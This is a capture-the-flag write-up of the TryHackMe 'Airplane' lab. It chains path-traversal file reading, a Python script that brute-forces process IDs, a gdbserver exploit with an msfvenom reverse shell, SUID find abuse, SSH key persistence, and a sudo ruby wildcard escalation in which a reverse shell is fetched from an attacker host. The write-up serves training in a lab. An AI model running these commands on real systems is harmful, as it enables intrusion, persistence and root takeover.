---
tags:
  - THM
  - Linux
  - Medium
  - LFI
  - Brute-Force
  - Scripting
  - RCE
  - SUID
  - Sudo
---
https://tryhackme.com/room/airplane/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.169.44 airplane.thm
```
# Scanning
```console
$ nmap -p22,6048,8000 -sV -sC airplane.thm

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Exploitation
## LFI
The website at port 8000 just talks about airplanes. However, we can notice a vulnerable `page` parameter in the URL. We can **read internal files** using directory path traversal:
```console
$ curl -s 'http://airplane.thm:8000/?page=../../../../etc/passwd' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

After enumerating different system files, I was just not able to get RCE. So, I created a Python script `discovery.py` to **find internal running processes** by brute-forcing PIDs:
```python
#!/usr/bin/env python3
import requests

main_url = 'http://airplane.thm:8000/?page=../../../..'

for pid in range(1, 1001):
    full_url = f"{main_url}/proc/{pid}/cmdline"
    r = requests.get(full_url, timeout=3)
    cmd = r.content.replace(b"\x00", b" ").strip().decode()
    
    if cmd != '' and cmd != 'Page not found':
        print(f"{pid}\t{cmd}")
```

After some time, I discovered that the **unknown service** running on port 6048 is `/usr/bin/gdbserver`:
```console
$ python3 discovery.py
...
530	/usr/sbin/NetworkManager --no-daemon
535	/usr/bin/gdbserver 0.0.0.0:6048 airplane
537	/usr/bin/python3 app.py
...
```
## RCE
Found an [exploit](https://www.exploit-db.com/exploits/50539) for `gdbserver`, so first we listen for connections:
```console
$ nc -lvnp 4444
```

Then, we prepare the exploit and execute it:
```console
$ searchsploit -m linux/remote/50539.py

$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.150.216 LPORT=4444 PrependFork=true -o rev.bin

$ python3 50539.py airplane.thm:6048 rev.bin
```
# Post-Exploitation
## User Migration
We are currently user **hudson**:
```console
$ whoami
hudson
```

Found an **SUID binary** owned by **carlos**:
```console
$ find / -perm -4000 2>/dev/null
/usr/bin/find
...

$ ls -l /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
```

Became **carlos** by following [GTFOBins guide](https://gtfobins.org/gtfobins/find/):
```console
$ find . -exec /bin/sh -p \; -quit

$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

As we can see, only EUID was changed, we still need to modify UID and GID. We will generate **persistence via SSH**, so first we generate keys in the local machine:
```console
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
...

$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1...
```

Now, we store the keys in **carlos'** SSH folder:
```console
$ echo 'ssh-rsa AAAAB3NzaC1...' > /home/carlos/.ssh/authorized_keys
```

Finally, we re-connect via SSH and get the **user flag**:
```console
$ ssh -i id_rsa carlos@airplane.thm
...

$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo)

$ cat /home/carlos/user.txt
```

## Privilege Escalation

We can execute any ruby file as **root**. The wildcard `*` allows directory path traversal again:
```console
$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

In local machine, we generate a ruby reverse shell file `rev.rb` and share it via Python server:
```console
$ msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.150.216 LPORT=4444 -o rev.rb

$ python3 -m http.server
```

We listen for connections:
```console
$ nc -lvnp 4444
```

Now, we transfer the ruby file and execute it as root:
```console
$ cd /tmp

$ wget http://192.168.150.216:8000/rev.rb
...

$ sudo /usr/bin/ruby /root/../tmp/rev.rb
```

Finally, we get the **root flag**:
```console
# cat /root/root.txt
```